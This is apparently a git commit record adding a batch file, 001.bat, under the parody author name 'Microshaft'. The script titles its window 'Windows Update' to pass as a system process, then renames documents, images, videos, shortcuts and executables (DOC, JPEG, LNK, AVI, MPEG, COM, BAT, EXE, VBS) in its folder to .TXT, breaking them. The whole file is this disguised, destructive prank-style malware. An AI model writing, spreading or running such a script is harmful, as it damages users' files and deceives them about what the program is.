91b0909819c6337bcedcddb299efcd761bc1c7eb
Microshaft <41166367+MicroshaftCorp@users.noreply.github.com>
2018-07-15 11:27:03 -0700

    Create 001.bat

---
+++ 001.bat
@@ -0,0 +1,12 @@
+@echo off
+title Windows Update
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+timeout 1
+REN *.EXE *.TXT
+REN *.VBS *.TXT
